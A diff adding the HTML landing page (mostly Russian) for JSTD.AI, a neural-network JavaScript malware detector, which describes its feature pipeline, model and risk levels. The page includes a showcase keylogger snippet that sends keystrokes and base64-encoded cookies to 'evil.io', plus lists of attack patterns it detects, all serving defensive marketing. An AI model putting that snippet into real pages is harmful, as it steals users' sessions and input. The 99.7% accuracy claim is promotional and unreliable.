@@ -1,0 +1,1173 @@
+<!DOCTYPE html>
+<html lang="ru" translate="no">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script>
+        ! function () {
+            var l = localStorage.getItem('jstd_lang') || (navigator.language || '').slice(0, 2);
+            if (l !== 'ru') document.documentElement.classList.add('lang-loading');
+        }();
+    </script>
+    <title>JSTD.AI — Neural JavaScript Threat Detection</title>
+    <meta name="google" content="notranslate" />
+    <meta name="robots" content="index, follow" />
+    <meta name="description" content="Нейросетевая модель 50→30→1 анализирует JavaScript на обфускацию, вредоносные конструкции и зловреды за миллисекунды. Точность 99.7%. Без GPU и облака." />
+    <meta name="keywords" content="JavaScript security, malware detection, obfuscation detection, JS threat analysis, neural network security, JSTD.AI" />
+    <link rel="canonical" href="https://jstd.su/" />
+    <link rel="alternate" hreflang="ru" href="https://jstd.su/" />
+    <link rel="alternate" hreflang="en" href="https://jstd.su/en/" />
+    <link rel="alternate" hreflang="x-default" href="https://jstd.su/" />
+    <link rel="icon" type="image/png" href="/favicon.png" />
+    <link rel="shortcut icon" type="image/png" href="favicon.png" />
+    <meta name="author" content="JSTD.AI" />
+    <meta name="theme-color" content="#0a0e1a" />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="JSTD.AI" />
+    <meta property="og:title" content="JSTD.AI — Neural JavaScript Threat Detection" />
+    <meta property="og:description" content="Нейросетевая модель 50→30→1 для анализа JavaScript на угрозы, обфускацию и зловреды. Точность 99.7%. Без GPU и облака." />
+    <meta property="og:url" content="https://jstd.su/" />
+    <meta property="og:image" content="https://jstd.su/favicon.png" />
+    <meta property="og:image:width" content="512" />
+    <meta property="og:image:height" content="512" />
+    <meta property="og:locale" content="ru_RU" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="JSTD.AI — Neural JavaScript Threat Detection" />
+    <meta name="twitter:description" content="Нейросетевая модель 50→30→1 для анализа JavaScript на угрозы, обфускацию и зловреды. Точность 99.7%. Без GPU и облака." />
+    <meta name="twitter:image" content="https://jstd.su/favicon.png" />
+    <link rel="stylesheet" href="styles/main.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet" />
+</head>
+
+<body>
+
+    <!-- ░░ CANVAS STARFIELD ░░ -->
+    <canvas id="starfield"></canvas>
+
+    <!-- ░░ NAV ░░ -->
+    <nav class="nav">
+        <div class="nav__inner">
+            <a href="#" class="nav__logo">
+                <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                    <path d="M16 2L4 7.5V16C4 22.627 9.373 28 16 28C22.627 28 28 22.627 28 16V7.5L16 2Z" stroke="#00d4ff" stroke-width="1.5" fill="none" />
+                    <path d="M16 7L9 10.25V16C9 19.866 12.134 23 16 23C19.866 23 23 19.866 23 16V10.25L16 7Z" fill="#00d4ff" fill-opacity="0.12" stroke="#00d4ff" stroke-width="1" />
+                    <path d="M13 16L15.5 18.5L20 13" stroke="#00d4ff" stroke-width="1.5" stroke-linecap="square" />
+                    <circle cx="16" cy="16" r="1.5" fill="#00d4ff" />
+                </svg>
+                <span class="nav__logo-text">JSTD<span class="brand-accent">.AI</span></span>
+            </a>
+            <ul class="nav__links">
+                <li><a href="#how-it-works" data-i18n="nav.how">Принцип работы</a></li>
+                <li><a href="#algorithms" data-i18n="nav.algorithms">Алгоритмы</a></li>
+                <li><a href="#docs" data-i18n="nav.docs">Документация</a></li>
+                <li><a href="#testimonials" data-i18n="nav.testimonials">Отзывы</a></li>
+                <li><a href="#cta" class="nav__cta-link" data-i18n="nav.try">Попробовать</a></li>
+                <li class="nav__lang-switch">
+                    <button class="lang-btn" data-lang-switch="ru">RU</button>
+                    <span class="lang-sep">/</span>
+                    <button class="lang-btn" data-lang-switch="en">EN</button>
+                </li>
+            </ul>
+            <button class="nav__burger" id="navBurger" aria-label="Меню">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                    <path d="M3 6H21M3 12H21M3 18H21" stroke="currentColor" stroke-width="1.5" stroke-linecap="square" />
+                </svg>
+            </button>
+        </div>
+    </nav>
+
+    <!-- ░░ HERO ░░ -->
+    <section class="hero" id="hero">
+        <div class="hero__grid-overlay"></div>
+        <div class="hero__content">
+            <div class="hero__badge">
+                <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+                    <circle cx="7" cy="7" r="3" fill="#00ff88" />
+                    <circle cx="7" cy="7" r="6" stroke="#00ff88" stroke-width="1" opacity="0.4" />
+                </svg> <span data-i18n="hero.badge">Neural Analysis Engine v3.1 — Активен</span>
+            </div>
+            <h1 class="hero__headline" data-i18n-html="hero.headline_html">
+                Уязвимости в коде видны до того, как они
+                <span class="cracked-word" data-text="взорвутся">взорвутся</span>
+            </h1>
+            <p class="hero__sub" data-i18n-html="hero.sub">
+                Проприетарная нейросетевая модель <strong>50→30→1</strong> анализирует любой JavaScript на обфускацию, вредоносные конструкции и вшитые зловреды за миллисекунды. Работает на слабом железе. Не требует облака.
+            </p>
+            <div class="hero__actions">
+                <a href="#cta" class="btn btn--primary">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                        <path d="M2 8H14M9 3L14 8L9 13" stroke="currentColor" stroke-width="1.5" stroke-linecap="square" />
+                    </svg> <span data-i18n="hero.cta_primary">Начать анализ</span>
+                </a>
+                <a href="#how-it-works" class="btn btn--ghost">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                        <circle cx="8" cy="8" r="6" stroke="currentColor" stroke-width="1.5" />
+                        <path d="M8 5V9M8 11V11.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="square" />
+                    </svg> <span data-i18n="hero.cta_secondary">Как это работает</span>
+                </a>
+            </div>
+            <div class="hero__stats">
+                <div class="stat-pill">
+                    <div class="stat-pill__value">
+                        <span class="stat-pill__num" data-count="99.7">0</span><span class="stat-pill__unit">%</span>
+                    </div>
+                    <span class="stat-pill__label" data-i18n="hero.stat1">Точность детекции</span>
+                </div>
+                <div class="stat-pill">
+                    <div class="stat-pill__value">
+                        <span class="stat-pill__num" data-count="1561">0</span>
+                    </div>
+                    <span class="stat-pill__label" data-i18n="hero.stat2">параметров модели</span>
+                </div>
+                <div class="stat-pill">
+                    <div class="stat-pill__value">
+                        <span class="stat-pill__num" data-count="50">0</span>
+                    </div>
+                    <span class="stat-pill__label" data-i18n="hero.stat3">признаков кода</span>
+                </div>
+                <div class="stat-pill">
+                    <div class="stat-pill__value">
+                        <span class="stat-pill__num stat-pill__num--static">&lt;&thinsp;1</span><span class="stat-pill__unit">ms</span>
+                    </div>
+                    <span class="stat-pill__label" data-i18n="hero.stat4">без GPU</span>
+                </div>
+            </div>
+        </div>
+        <div class="hero__visual">
+            <div class="threat-card" id="heroThreatCard">
+                <div class="threat-card__header">
+                    <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+                        <path d="M9 1L1 5V10C1 13.866 4.686 17 9 17C13.314 17 17 13.866 17 10V5L9 1Z" stroke="currentColor" stroke-width="1.3" />
+                        <path d="M9 6V10M9 12.5V13" stroke="currentColor" stroke-width="1.5" stroke-linecap="square" />
+                    </svg>
+                    <span id="heroThreatLabel">SAFE</span>
+                    <span class="threat-card__score" id="heroScore">0.00%</span>
+                </div>
+                <div class="threat-card__code" id="heroCode"></div>
+                <div class="threat-card__rules">
+                    <div class="rule-item rule-item--high" id="heroRule0">
+                        <span class="rule-dot"></span>DOM prototype hijack<span class="rule-pct" id="heroRulePct0">0%</span>
+                    </div>
+                    <div class="rule-item rule-item--high" id="heroRule1">
+                        <span class="rule-dot"></span>C2 data exfiltration<span class="rule-pct" id="heroRulePct1">0%</span>
+                    </div>
+                    <div class="rule-item rule-item--high" id="heroRule2">
+                        <span class="rule-dot"></span>Keystroke logging<span class="rule-pct" id="heroRulePct2">0%</span>
+                    </div>
+                    <div class="rule-item rule-item--med" id="heroRule3">
+                        <span class="rule-dot"></span>Supply chain injection<span class="rule-pct" id="heroRulePct3">0%</span>
+                    </div>
+                </div>
+                <div class="threat-card__bar">
+                    <div class="threat-card__bar-fill" id="heroBarFill" style="width:0%"></div>
+                </div>
+            </div>
+        </div>
+        <div class="hero__scroll-hint" aria-hidden="true">
+            <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
+                <path d="M11 3V17M5 11L11 17L17 11" stroke="currentColor" stroke-width="1.5" stroke-linecap="square" />
+            </svg>
+        </div>
+    </section>
+
+    <!-- ░░ MARQUEE STRIP ░░ -->
+    <div class="marquee-strip">
+        <div class="marquee-track">
+            <span data-i18n="mq.obfusc">Обфускация</span><span class="sep">✦</span>
+            <span data-i18n="mq.cookie">Кража cookies</span><span class="sep">✦</span>
+            <span data-i18n="mq.eval">eval() инъекции</span><span class="sep">✦</span>
+            <span data-i18n="mq.keylog">Кейлоггеры</span><span class="sep">✦</span>
+            <span>Prototype Pollution</span><span class="sep">✦</span>
+            <span>Base64 + eval</span><span class="sep">✦</span>
+            <span>Hidden iframes</span><span class="sep">✦</span>
+            <span>WebSocket exfiltration</span><span class="sep">✦</span>
+            <span data-i18n="mq.miners">Скрытые майнеры</span><span class="sep">✦</span>
+            <span data-i18n="mq.xss">XSS векторы</span><span class="sep">✦</span>
+            <span>Remote script injection</span><span class="sep">✦</span>
+            <span>Function constructor abuse</span><span class="sep">✦</span>
+
+            <span data-i18n="mq.obfusc">Обфускация</span><span class="sep">✦</span>
+            <span data-i18n="mq.cookie">Кража cookies</span><span class="sep">✦</span>
+            <span data-i18n="mq.eval">eval() инъекции</span><span class="sep">✦</span>
+            <span data-i18n="mq.keylog">Кейлоггеры</span><span class="sep">✦</span>
+            <span>Prototype Pollution</span><span class="sep">✦</span>
+            <span>Base64 + eval</span><span class="sep">✦</span>
+            <span>Hidden iframes</span><span class="sep">✦</span>
+            <span>WebSocket exfiltration</span><span class="sep">✦</span>
+            <span data-i18n="mq.miners">Скрытые майнеры</span><span class="sep">✦</span>
+            <span data-i18n="mq.xss">XSS векторы</span><span class="sep">✦</span>
+            <span>Remote script injection</span><span class="sep">✦</span>
+            <span>Function constructor abuse</span><span class="sep">✦</span>
+        </div>
+    </div>
+
+    <!-- ░░ HOW IT WORKS ░░ -->
+    <section class="section" id="how-it-works">
+        <div class="container">
+            <div class="section__label" data-i18n="hiw.label">Принцип работы</div>
+            <h2 class="section__title" data-i18n-html="hiw.title_html">
+                Нейросеть видит то, что<br />не видит человек
+            </h2>
+            <p class="section__desc" data-i18n="hiw.desc">
+                JSTD.AI использует трёхэтапный конвейер анализа: извлечение признаков → нейронная сеть → эвристические правила. Каждый этап усиливает следующий — итоговая оценка невозможна без консенсуса всех трёх.
+            </p>
+
+            <div class="pipeline">
+                <div class="pipeline__step" data-step="01">
+                    <div class="pipeline__icon">
+                        <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+                            <rect x="4" y="2" width="24" height="28" stroke="#00d4ff" stroke-width="1.3" />
+                            <path d="M9 8H23M9 13H23M9 18H17" stroke="#00d4ff" stroke-width="1.3" stroke-linecap="square" />
+                            <circle cx="22" cy="22" r="5" fill="#050810" stroke="#00ff88" stroke-width="1.3" />
+                            <path d="M20 22L21.5 23.5L24 21" stroke="#00ff88" stroke-width="1.2" stroke-linecap="square" />
+                        </svg>
+                    </div>
+                    <h3 data-i18n="hiw.s1_h3">Загрузка файла</h3>
+                    <p data-i18n="hiw.s1_p">JS-файл читается как текст целиком. Никакой передачи в облако — всё локально. Поддержка минифицированного, обфусцированного, многострочного кода.</p>
+                </div>
+                <div class="pipeline__arrow">
+                    <svg width="40" height="16" viewBox="0 0 40 16" fill="none">
+                        <path d="M0 8H36M31 3L37 8L31 13" stroke="#00d4ff" stroke-width="1.3" stroke-linecap="square" />
+                    </svg>
+                </div>
+                <div class="pipeline__step" data-step="02">
+                    <div class="pipeline__icon">
+                        <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+                            <rect x="2" y="6" width="12" height="20" stroke="#a78bfa" stroke-width="1.3" />
+                            <rect x="18" y="6" width="12" height="20" stroke="#a78bfa" stroke-width="1.3" />
+                            <path d="M14 16H18M11 10H17M11 22H17" stroke="#a78bfa" stroke-width="1.3" stroke-linecap="square" />
+                            <path d="M6 11H10M6 16H10M6 21H10" stroke="#a78bfa" stroke-width="1" opacity=".6" />
+                            <path d="M22 11H26M22 16H26M22 21H26" stroke="#a78bfa" stroke-width="1" opacity=".6" />
+                        </svg>
+                    </div>
+                    <h3 data-i18n="hiw.s2_h3">Извлечение 50 признаков</h3>
+                    <p data-i18n="hiw.s2_p">Нормализованные метрики: частота опасных конструкций, энтропия Шеннона, уровень обфускации, плотность Base64, соотношение комментариев и многое другое.</p>
+                </div>
+                <div class="pipeline__arrow">
+                    <svg width="40" height="16" viewBox="0 0 40 16" fill="none">
+                        <path d="M0 8H36M31 3L37 8L31 13" stroke="#00d4ff" stroke-width="1.3" stroke-linecap="square" />
+                    </svg>
+                </div>
+                <div class="pipeline__step" data-step="03">
+                    <div class="pipeline__icon">
+                        <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+                            <circle cx="4" cy="8" r="2.5" stroke="#00d4ff" stroke-width="1.2" />
+                            <circle cx="4" cy="16" r="2.5" stroke="#00d4ff" stroke-width="1.2" />
+                            <circle cx="4" cy="24" r="2.5" stroke="#00d4ff" stroke-width="1.2" />
+                            <circle cx="16" cy="6" r="2.5" stroke="#a78bfa" stroke-width="1.2" />
+                            <circle cx="16" cy="14" r="2.5" stroke="#a78bfa" stroke-width="1.2" />
+                            <circle cx="16" cy="22" r="2.5" stroke="#a78bfa" stroke-width="1.2" />
+                            <circle cx="28" cy="16" r="2.5" stroke="#00ff88" stroke-width="1.2" />
+                            <path d="M6.5 8.5L13.5 6.5M6.5 9L13.5 14M6.5 16L13.5 14M6.5 16L13.5 22M6.5 23.5L13.5 22" stroke="#334155" stroke-width="1" opacity=".7" />
+                            <path d="M18.5 6.5L25.5 15.5M18.5 14L25.5 16M18.5 22L25.5 16.5" stroke="#334155" stroke-width="1" opacity=".7" />
+                        </svg>
+                    </div>
+                    <h3 data-i18n="hiw.s3_h3">Нейронная сеть 50→30→1</h3>
+                    <p data-i18n-html="hiw.s3_p">1561 обученный параметр. Архитектура MLP с ReLU-активацией. Обучена на 210 размеченных примерах. Точность — 99.7%. Работает без GPU за &lt;1 мс.</p>
+                </div>
+                <div class="pipeline__arrow">
+                    <svg width="40" height="16" viewBox="0 0 40 16" fill="none">
+                        <path d="M0 8H36M31 3L37 8L31 13" stroke="#00d4ff" stroke-width="1.3" stroke-linecap="square" />
+                    </svg>
+                </div>
+                <div class="pipeline__step" data-step="04">
+                    <div class="pipeline__icon">
+                        <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+                            <path d="M4 4H14V14H4V4Z" stroke="#ff3366" stroke-width="1.3" />
+                            <path d="M18 4H28V14H18V4Z" stroke="#ff3366" stroke-width="1.3" opacity=".5" />
+                            <path d="M4 18H14V28H4V18Z" stroke="#ff3366" stroke-width="1.3" opacity=".5" />
+                            <path d="M18 18H28V28H18V18Z" stroke="#ff3366" stroke-width="1.3" />
+                            <path d="M7 9H11M21 9H25M7 23H11M21 23H25" stroke="#ff3366" stroke-width="1.3" stroke-linecap="square" />
+                        </svg>
+                    </div>
+                    <h3 data-i18n="hiw.s4_h3">Эвристические правила</h3>
+                    <p data-i18n="hiw.s4_p">42 паттерна угроз, включая комбинированные сценарии. Детектирует сигнатуры кража-cookie, кейлоггеры, внедрение iframe и цепочки обфускации.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ░░ ALGORITHMS ░░ -->
+    <section class="section section--dark" id="algorithms">
+        <div class="container">
+            <div class="section__label" data-i18n="algo.label">Алгоритмы</div>
+            <h2 class="section__title" data-i18n-html="algo.title_html">Архитектура, которая<br />не даёт шансов</h2>
+
+            <div class="algo-grid">
+
+                <!-- Neural Net Diagram -->
+                <div class="algo-card algo-card--wide">
+                    <div class="algo-card__label" data-i18n="algo.nn_label">Топология нейросети</div>
+                    <h3>50 → 30 → 1</h3>
+                    <p data-i18n="algo.nn_p">Многослойный перцептрон с прямым распространением ошибки. Адаптивная скорость обучения снижается от 0.015 до 0.008 за 300 эпох.</p>
+                    <div class="nn-diagram">
+                        <div class="nn-col" id="nnColInput">
+                            <div class="nn-label" data-i18n-html="algo.nn_in_html">Входной<br />слой</div>
+                            <div class="nn-sublabel" data-i18n="algo.nn_in_sub">50 нейронов</div>
+                        </div>
+                        <canvas class="nn-canvas" id="nnCanvas" width="260" height="260"></canvas>
+                        <div class="nn-col" id="nnColHidden">
+                            <div class="nn-label" data-i18n-html="algo.nn_hid_html">Скрытый<br />слой</div>
+                            <div class="nn-sublabel" data-i18n="algo.nn_hid_sub">30 нейронов</div>
+                        </div>
+                        <canvas class="nn-canvas" id="nnCanvas2" width="160" height="260"></canvas>
+                        <div class="nn-col" id="nnColOutput">
+                            <div class="nn-label" data-i18n-html="algo.nn_out_html">Выходной<br />слой</div>
+                            <div class="nn-sublabel" data-i18n="algo.nn_out_sub">1 нейрон</div>
+                        </div>
+                    </div>
+                    <div class="nn-params">
+                        <div class="nn-param"><span data-i18n="algo.p_in_lbl">Вход → Скрытый</span><strong data-i18n-html="algo.p_in_val">1 500 весов</strong></div>
+                        <div class="nn-param"><span data-i18n="algo.p_hid_lbl">Скрытый → Выход</span><strong data-i18n-html="algo.p_hid_val">30 весов</strong></div>
+                        <div class="nn-param"><span data-i18n="algo.p_bias_lbl">Смещения</span><strong data-i18n-html="algo.p_bias_val">31 параметр</strong></div>
+                        <div class="nn-param nn-param--total"><span data-i18n="algo.p_tot_lbl">ИТОГО</span><strong data-i18n-html="algo.p_tot_val">1 561 параметр</strong></div>
+                    </div>
+                </div>
+
+                <!-- Feature Extraction -->
+                <div class="algo-card">
+                    <div class="algo-card__label" data-i18n="algo.feat_label">Извлечение признаков</div>
+                    <h3 data-i18n="algo.feat_h3">50 метрик кода</h3>
+                    <p data-i18n="algo.feat_p">Каждый признак нормализован относительно длины файла для корректного сравнения файлов разного размера.
+                    </p>
+                    <div class="features-visual">
+                        <div class="feat-bar-group">
+                            <div class="feat-bar" style="--v:83%;--c:#ff3366" data-label="eval()"><span>eval()</span>
+                                <div class="feat-bar__fill"></div><em>0.83</em>
+                            </div>
+                            <div class="feat-bar" style="--v:75%;--c:#ff6600" data-label="Base64"><span>Base64</span>
+                                <div class="feat-bar__fill"></div><em>0.75</em>
+                            </div>
+                            <div class="feat-bar" style="--v:81%;--c:#ff3366" data-label="fetch()"><span>fetch()</span>
+                                <div class="feat-bar__fill"></div><em>0.81</em>
+                            </div>
+                            <div class="feat-bar" style="--v:79%;--c:#ff6600" data-label="cookie"><span>cookie</span>
+                                <div class="feat-bar__fill"></div><em>0.79</em>
+                            </div>
+                            <div class="feat-bar" style="--v:62%;--c:#f59e0b" data-label="Энтропия">
+                                <span data-i18n="algo.feat_entropy">Энтропия</span>
+                                <div class="feat-bar__fill"></div><em>0.62</em>
+                            </div>
+                            <div class="feat-bar" style="--v:45%;--c:#a78bfa" data-label="Обфуск."><span data-i18n="algo.feat_obfusc">Обфуск.</span>
+                                <div class="feat-bar__fill"></div><em>0.45</em>
+                            </div>
+                            <div class="feat-bar" style="--v:18%;--c:#00d4ff" data-label="XHR"><span>XHR</span>
+                                <div class="feat-bar__fill"></div><em>0.18</em>
+                            </div>
+                            <div class="feat-bar" style="--v:5%;--c:#00ff88" data-label="Comments"><span>Comments</span>
+                                <div class="feat-bar__fill"></div><em>0.05</em>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Entropy Analysis -->
+                <div class="algo-card">
+                    <div class="algo-card__label" data-i18n="algo.ent_label">Энтропия Шеннона</div>
+                    <h3 data-i18n="algo.ent_h3">Хаос — это сигнал</h3>
+                    <p data-i18n="algo.ent_p">Случайность символов — прямой индикатор обфускации. Легитимный код предсказуем. Вредонос — нет.
+                    </p>
+                    <div class="entropy-visual">
+                        <div class="entropy-row">
+                            <span class="entropy-code">"aaaaaaa"</span>
+                            <div class="entropy-bar">
+                                <div class="entropy-fill" style="width:0%;--c:#00ff88"></div>
+                            </div>
+                            <span class="entropy-val safe" data-i18n="algo.ent_v1">Н=0.0</span>
+                        </div>
+                        <div class="entropy-row">
+                            <span class="entropy-code">function()</span>
+                            <div class="entropy-bar">
+                                <div class="entropy-fill" style="width:42%;--c:#00d4ff"></div>
+                            </div>
+                            <span class="entropy-val" data-i18n="algo.ent_v2">Н=3.3</span>
+                        </div>
+                        <div class="entropy-row">
+                            <span class="entropy-code">fetch('/api')</span>
+                            <div class="entropy-bar">
+                                <div class="entropy-fill" style="width:55%;--c:#f59e0b"></div>
+                            </div>
+                            <span class="entropy-val" data-i18n="algo.ent_v3">Н=4.1</span>
+                        </div>
+                        <div class="entropy-row">
+                            <span class="entropy-code">atob('dX...')</span>
+                            <div class="entropy-bar">
+                                <div class="entropy-fill" style="width:78%;--c:#ff6600"></div>
+                            </div>
+                            <span class="entropy-val warn" data-i18n="algo.ent_v4">Н=5.8</span>
+                        </div>
+                        <div class="entropy-row">
+                            <span class="entropy-code">\x64\x6f\x63...</span>
+                            <div class="entropy-bar">
+                                <div class="entropy-fill" style="width:100%;--c:#ff3366"></div>
+                            </div>
+                            <span class="entropy-val crit" data-i18n="algo.ent_v5">Н=7.9</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Threat Levels -->
+                <div class="algo-card">
+                    <div class="algo-card__label" data-i18n="algo.thr_label">Классификация угроз</div>
+                    <h3 data-i18n="algo.thr_h3">5 уровней риска</h3>
+                    <p data-i18n="algo.thr_p">Итоговый балл — взвешенная комбинация нейросетевого скора и эвристических триггеров. Ни один компонент не принимает решение в одиночку.</p>
+                    <div class="levels-visual">
+                        <div class="level-row">
+                            <div class="level-badge safe">SAFE</div>
+                            <div class="level-range">0 – 15%</div>
+                            <div class="level-desc" data-i18n="algo.lv_safe">Легитимный код. Угроз не обнаружено.</div>
+                        </div>
+                        <div class="level-row">
+                            <div class="level-badge low">LOW</div>
+                            <div class="level-range">15 – 35%</div>
+                            <div class="level-desc" data-i18n="algo.lv_low">Незначительные подозрительные конструкции.</div>
+                        </div>
+                        <div class="level-row">
+                            <div class="level-badge med">MEDIUM</div>
+                            <div class="level-range">35 – 65%</div>
+                            <div class="level-desc" data-i18n="algo.lv_med">Требует проверки. Возможные нарушения.</div>
+                        </div>
+                        <div class="level-row">
+                            <div class="level-badge high">HIGH</div>
+                            <div class="level-range">65 – 85%</div>
+                            <div class="level-desc" data-i18n="algo.lv_high">Высокая вероятность вредоносности.</div>
+                        </div>
+                        <div class="level-row">
+                            <div class="level-badge crit">CRITICAL</div>
+                            <div class="level-range">85 – 100%</div>
+                            <div class="level-desc" data-i18n="algo.lv_crit">НЕ ЗАПУСКАТЬ. Многократные триггеры.</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Weighted score -->
+                <div class="algo-card">
+                    <div class="algo-card__label" data-i18n="algo.sc_label">Итоговый скор</div>
+                    <h3 data-i18n="algo.sc_h3">Взвешенная формула</h3>
+                    <p data-i18n="algo.sc_p">Финальный балл угрозы — не просто выход нейросети. Это консенсус трёх независимых компонентов с динамическими весами.</p>
+                    <div class="score-formula">
+                        <div class="score-formula__row">
+                            <span class="sf-label" data-i18n="algo.sc_nn">Нейросеть</span>
+                            <div class="sf-bar">
+                                <div class="sf-fill" style="--w:60%;--c:#00d4ff"></div>
+                            </div>
+                            <span class="sf-weight">×0.60</span>
+                        </div>
+                        <div class="score-formula__row">
+                            <span class="sf-label" data-i18n="algo.sc_heur">Эвристика</span>
+                            <div class="sf-bar">
+                                <div class="sf-fill" style="--w:30%;--c:#a78bfa"></div>
+                            </div>
+                            <span class="sf-weight">×0.30</span>
+                        </div>
+                        <div class="score-formula__row">
+                            <span class="sf-label" data-i18n="algo.sc_ent">Энтропия</span>
+                            <div class="sf-bar">
+                                <div class="sf-fill" style="--w:10%;--c:#f59e0b"></div>
+                            </div>
+                            <span class="sf-weight">×0.10</span>
+                        </div>
+                        <div class="score-formula__divider"></div>
+                        <div class="score-formula__result">
+                            <span data-i18n="algo.sc_tot">Итог</span>
+                            <span class="sf-example">0.60·NN + 0.30·H + 0.10·E</span>
+                        </div>
+                        <div class="score-formula__note" data-i18n="algo.sc_note">Веса автоматически пересчитываются при отсутствии эвристических триггеров
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Obfuscation patterns -->
+                <div class="algo-card algo-card--wide">
+                    <div class="algo-card__label" data-i18n="algo.ob_label">Детекция обфускации</div>
+                    <h3 data-i18n="algo.ob_h3">Паттерны, которые прячутся</h3>
+                    <div class="obfusc-grid">
+                        <div class="obfusc-item">
+                            <div class="obfusc-icon">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                                    <path d="M3 12L21 12M3 12L9 6M3 12L9 18" stroke="#ff3366" stroke-width="1.4" stroke-linecap="square" />
+                                </svg>
+                            </div>
+                            <strong data-i18n="algo.ob_hex_t">Hex-эскейпинг</strong>
+                            <code>\x48\x65\x6c\x6c\x6f</code>
+                            <span data-i18n="algo.ob_hex_d">Строки зашифрованы hex-последовательностями</span>
+                        </div>
+                        <div class="obfusc-item">
+                            <div class="obfusc-icon">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                                    <rect x="3" y="3" width="8" height="8" stroke="#ff6600" stroke-width="1.4" />
+                                    <rect x="13" y="3" width="8" height="8" stroke="#ff6600" stroke-width="1.4" opacity=".5" />
+                                    <rect x="3" y="13" width="8" height="8" stroke="#ff6600" stroke-width="1.4" opacity=".5" />
+                                    <rect x="13" y="13" width="8" height="8" stroke="#ff6600" stroke-width="1.4" />
+                                </svg>
+                            </div>
+                            <strong>Array shuffling</strong>
+                            <code>_0x4a2b[0], [1]...</code>
+                            <span data-i18n="algo.ob_arr_d">Строки разбиты по массивам с индексами</span>
+                        </div>
+                        <div class="obfusc-item">
+                            <div class="obfusc-icon">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                                    <circle cx="12" cy="12" r="9" stroke="#f59e0b" stroke-width="1.4" />
+                                    <path d="M12 7V13L16 15" stroke="#f59e0b" stroke-width="1.4" stroke-linecap="square" />
+                                </svg>
+                            </div>
+                            <strong data-i18n="algo.ob_b64_t">Base64 цепочки</strong>
+                            <code>eval(atob('...'))</code>
+                            <span data-i18n="algo.ob_b64_d">Многоуровневое декодирование перед исполнением</span>
+                        </div>
+                        <div class="obfusc-item">
+                            <div class="obfusc-icon">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                                    <path d="M4 4L20 20M4 20L20 4" stroke="#a78bfa" stroke-width="1.4" stroke-linecap="square" />
+                                </svg>
+                            </div>
+                            <strong>Function constructor</strong>
+                            <code>new Function(str)()</code>
+                            <span data-i18n="algo.ob_fn_d">Динамическое создание и запуск функций из строк</span>
+                        </div>
+                        <div class="obfusc-item">
+                            <div class="obfusc-icon">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                                    <path d="M5 3H19V21H5V3Z" stroke="#00d4ff" stroke-width="1.4" />
+                                    <path d="M9 8H15M9 12H15M9 16H12" stroke="#00d4ff" stroke-width="1.2" opacity=".5" />
+                                </svg>
+                            </div>
+                            <strong>Prototype pollution</strong>
+                            <code>Object.prototype.__</code>
+                            <span data-i18n="algo.ob_pp_d">Модификация базовых цепочек прототипов</span>
+                        </div>
+                        <div class="obfusc-item">
+                            <div class="obfusc-icon">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                                    <path d="M12 3L3 8V16L12 21L21 16V8L12 3Z" stroke="#00ff88" stroke-width="1.4" />
+                                    <path d="M12 8V12M12 15V16" stroke="#00ff88" stroke-width="1.4" stroke-linecap="square" />
+                                </svg>
+                            </div>
+                            <strong>Self-modifying code</strong>
+                            <code>setTimeout(str, 0)</code>
+                            <span data-i18n="algo.ob_sm_d">Строки в таймерах и event listeners как код</span>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <!-- ░░ THREAT SHOWCASE ░░ -->
+    <section class="section" id="showcase">
+        <div class="container">
+            <div class="section__label" data-i18n="show.label">Реальные угрозы</div>
+            <h2 class="section__title" data-i18n-html="show.title_html">
+                Код, который <span class="highlight-slash">убивает</span><br /> безопасность за 3 строки
+            </h2>
+            <div class="showcase-grid">
+                <div class="showcase-item">
+                    <div class="showcase-item__header">
+                        <div class="level-badge crit">CRITICAL</div>
+                        <span data-i18n="show.i1">Кража сессии</span>
+                    </div>
+                    <pre class="showcase-code"><code><span class="c-comment">// Keylogger + exfiltration combo</span>
+<span class="c-kw">document</span>.<span class="c-fn">addEventListener</span>(<span class="c-str">'keypress'</span>, e =&gt; {
+   <span class="c-fn">fetch</span>(<span class="c-str">'https://evil.io/k?v='</span> + e.key);
+});
+<span class="c-kw">document</span>.<span class="c-fn">cookie</span> = <span class="c-str">''</span>;
+<span class="c-fn">fetch</span>(<span class="c-str">'https://evil.io/c?v='</span> +
+  <span class="c-kw">btoa</span>(<span class="c-kw">document</span>.cookie));</code></pre>
+                    <div class="showcase-item__score"><span class="score-bar" style="--w:96%"></span><strong>96.2%</strong></div>
+                </div>
+                <div class="showcase-item">
+                    <div class="showcase-item__header">
+                        <div class="level-badge crit">CRITICAL</div>
+                        <span data-i18n="show.i2">Полная обфускация</span>
+                    </div>
+                    <pre class="showcase-code"><code><span class="c-comment">// Array-shuffled obfuscation</span>
